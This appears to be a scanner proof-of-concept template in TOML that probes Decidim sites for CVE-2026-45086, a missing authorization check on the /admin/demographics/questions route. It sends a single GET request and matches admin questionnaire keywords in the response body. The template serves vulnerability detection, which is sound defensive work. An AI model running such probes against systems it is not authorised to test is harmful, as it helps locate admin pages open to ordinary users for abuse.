[info]
author = "ave"
description = "检测 Decidim 平台 /admin/demographics/questions 路由是否存在授权缺失漏洞，普通用户可直接访问管理问卷编辑界面"
id = "POC-AVE-2026-0273"
name = "CVE-2026-45086 PoC"
severity = "medium"
tags = ["ave-2026-0273"]
vuln_id = [
    "CVE-2026-45086",
    "AVE-2026-0273",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/demographics/questions"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "questionnaire",
    "demographics",
    "admin",
]
